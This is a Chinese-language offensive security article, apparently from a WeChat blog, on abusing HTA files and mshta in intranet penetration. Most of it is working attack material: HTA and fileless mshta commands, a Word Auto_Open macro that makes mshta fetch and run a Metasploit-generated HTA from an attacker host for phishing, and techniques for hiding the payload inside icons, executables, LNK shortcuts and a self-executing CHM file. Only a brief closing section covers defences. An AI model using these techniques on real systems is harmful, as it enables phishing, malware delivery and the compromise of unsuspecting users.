> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/40-IbiX2R5wRk0Cfm4bZuA)

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaib3xDLYxsgYUbDUFLK8ADofVLmI7nqqwBe3d59nPs3JfMeHdvgGmjfHwgNyboHD2qnARXu6T9fM8g/640?wx_fmt=png)

    点击上方 “蓝字” 关注我们

> 本文作者：****jokelove****（Ms08067 内网安全小组成员）  

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicklAS2T2URph3msv2bL7StJ92xMrc4fk1W3pibXbdutMbMVxmYVfW7USlEq1uKvTs7VpPnDdlfvVA/640?wx_fmt=png)  

**0x01 基础**  

HTA 是 HTML Application 的缩写，本⽂介绍 HTA 在内⽹渗透中的⼏种运⽤。

**⼀个简单的 VB 脚本**

HTA ⽂件可以解析 javascript 和 VB，因此在内⽹中可以⽤来绕过杀软或是实现邮件钓⻥。

```
<!--test1.hta-->
<html>
<head>
<title>ONE-简单脚本 </title>
</head>
<body>
<center>
<p>
HTA
HTMLApplication
HTML TEST
</p>
</center>
</body>
<script LANGUAGE="VBScript">
// 开启⼀个计算器
CreateObject("WScript.Shell").run("calc")
</script>
</html>
```

通过执⾏: mshta %cd%/test.hta 可以看到弹出⼀个计算器。

  

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaib3xDLYxsgYUbDUFLK8ADofyVAmDqLTUm7EHavzUK8OcSq83bibnmhajoUasknztVtY1YGFC0wuuqg/640?wx_fmt=jpeg)

  

  

双击时，会弹出 hta ⽂件的框，有时候为了避免弹出这个框，可以在 hta ⽂件中添加样式：

```
<HTA:APPLICATION icon="#" WINDOWSTATE="minimize" SHOWINTASKBAR="no"SYSMENU="no" CAPTION="no" />
```

**⽆⽂件执⾏ hta**  

mshta 命令可以⽤来直接解析 VBScript 代码，因此可以在 cmd 中直接输⼊:

```
mshta.exe javascript:"<script
LANGUAGE=\"VBScript\">CreateObject(\"WScript.Shell\").run(\"calc\")\r\n
close()</script>"
```

mshta.exe 的默认路径在 %windir%\system32\mshta.exe and %windir%\syswow64\mshta.exe

**⼩案例 - ⽣成钓⻥⽂件**

利⽤ metasploit ⽣成⼀个 hta ⽂件

  

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaib3xDLYxsgYUbDUFLK8ADofficeQhREmXgU26lia39xEsq1nW63A455Kdc5Ow3dsUXN3utHUDL8er2g/640?wx_fmt=jpeg)

  

  

**在 word 中开启宏命令进⾏下载：**

  

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaib3xDLYxsgYUbDUFLK8ADofkMT439MxLOyLMRx7acs9HaFZVlSiaFSQG5oXOmT6HPiaMWqf5NaVw0Tw/640?wx_fmt=jpeg)

  

  

脚本如下：

```
Sub Test()
PID = Shell("mshta.exe http://10.211.55.9:8080/XsFTbf3GZYiiz.ht
a")
End Sub

Sub Auto_Open()
Test
END Sub
```

剩下就是等待⽬标上线了。

**0x02 对 HTA 的⽂件的隐藏**

由于 MSHTA 对不同后缀的 hta ⽂件处理有所差异，我们可以通过修改后缀名的⽅式来进⼀步隐藏我们的脚本。第⼀种常⻅的⽅式是将 .hta 修改为 .html 。这种只能通过双击（Miscosoft 浏览器下）或者 mshta.exe 命令执⾏的⽅式来运⾏我们的 hta 脚本。

**为脚本加上图标**

默认的图标过于简单，很难吸引⼈去点击。因此，需要做⼀些⼩优化：

```
copy /b beauty.ico+test.hta test_with_beauty.hta
```

在 hta ⽂件中需要加上:

```
<HTA:APPLICATION icon="#" />
```

需要注意的是：

图标只可以在命令⾏上显示，在桌⾯上仍然没有图标

因此，我们必须寻找其它⽅法

**和 exe ⽂件进⾏拼接**

```
copy /b %windir%\system32\calc.exe+test.hta calc2.exe
calc2.exe # 正常运⾏计算机程序
mshta %cd%\calc2.exe # 执⾏的是HTA脚本
```

这样，我们可以在 exe 中绑定⼀个 hta ⽂件。

实战场景中，我们可以绑定⼀个 exe，并且添加可以调⽤ mshta 执⾏脚本的代码。也可以通过 shellcode 注⼊的⽅式来修改常⻅的 exe

**使⽤ LNK 快捷⽅式**

合上述讨论⼀致，通过：

```
Copy /b readme.txt.lnk+test.hta readme2.txt.lnk
```

点击 readme2.txt.lnk 时正常打开 readme.txt

使⽤ mshta readme2.txt.lnk 时，执⾏我们的脚本

**和帮助⽂件进⾏拼接**

上述的两种⽅式，都需要⼿⼯输⼊ mshta 命令来进⾏运⾏，如果仅仅需要⽤户双击既能运⾏正常的程序，⼜要执⾏我们的脚本，需要⽐较复杂的利⽤链条才能实现。下⾯介绍⼀种简单的⽅法：

**⽣成⼀个 chm ⽂件**

下载 HTML Help Workshop

写⼀个 HPP（帮助⽂档的描述⽂件）

```
[OPTIONS]
Compatibility=1.1 or later
Compiled file=hello.chm
Default topic=hello.htm
Display compile progress=No
Language=0x410 Italian (Italy)

[FILES]
hello.htm

[INFOTYPES]
```

3. 编写 Hello.htm

```
<html>
<title> Hello World! </title>
<head>
</head>
<body>

<OBJECT id=shortcut classid="clsid:52a2aaae-085d-4187-97ea-8c30db
990436" width=1 height=1>
<PARAM >
<PARAM >
<PARAM ,cmd,/c mshta %CD%\hello.chm">
<PARAM >
</OBJECT>
<SCRIPT>
shortcut.Click();
</SCRIPT>

<h2 align=center> CHM Example </h2>
<p><h3 align=center> This is a malicious CHM file </h3></p>
</body>
</html
```

4. 使⽤ HTML Help Workshop 编译⽣成 chm ⽂件

利⽤代码就时 hello.htm 的第 10 ⾏，

```
,cmd,/c mshta %CD%\hello.chm
```

**和 hta ⽂件进⾏绑定**

```
copy /b hello.chm+test.hta hello.chm
```

这样就实现了⽤户在点击时，在不影响原有程序的基础上执⾏我们的 hta 脚本。

**0x03 防范策略**

1. 禁⽤ office 上的宏命令

  

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaib3xDLYxsgYUbDUFLK8ADofEoHHpqRLXoKWLDBkFWR8HF9JNrThUAKJU9KVjZLDgppQHsiaiaE5s82Q/640?wx_fmt=jpeg)

  

  

2. 下载⽂件严格做好 md5 值验证

内网小组持续招人，扫描二维码加入我们！

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cRey7icGjpsvppvqqhcYo6RXAqJcUwZy3EfeNOkMRS37m0r44MWYIYmg/640?wx_fmt=png)

扫描下方二维码加入星球学习

邀请进入内部微信群，内部微信群永久有效！

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cniaUZzJeYAibE3v2VnNlhyC6fSTgtW94Pz51p0TSUl3AtZw0L1bDaAKw/640?wx_fmt=png) ![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cT2rJYbRzsO9Q3J9rSltBVzts0O7USfFR8iaFOBwKdibX3hZiadoLRJIibA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicBVC2S4ujJibsVHZ8Us607qBMpNj25fCmz9hP5T1yA6cjibXXCOibibSwQmeIebKa74v6MXUgNNuia7Uw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cRey7icGjpsvppvqqhcYo6RXAqJcUwZy3EfeNOkMRS37m0r44MWYIYmg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicjovru6mibAFRpVqK7ApHAwiaEGVqXtvB1YQahibp6eTIiaiap2SZPer1QXsKbNUNbnRbiaR4djJibmXAfQ/640?wx_fmt=jpeg) ![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicJ39cBtzvcja8GibNMw6y6Amq7es7u8A8UcVds7Mpib8Tzu753K7IZ1WdZ66fDianO2evbG0lEAlJkg/640?wx_fmt=png)  

目前 35000 + 人已关注加入我们  
![](https://mmbiz.qpic.cn/mmbiz_gif/XWPpvP3nWa9FwrfJTzPRIyROZ2xwWyk6xuUY59uvYPCLokCc6iarKrkOWlEibeRI9DpFmlyNqA2OEuQhyaeYXzrw/640?wx_fmt=gif)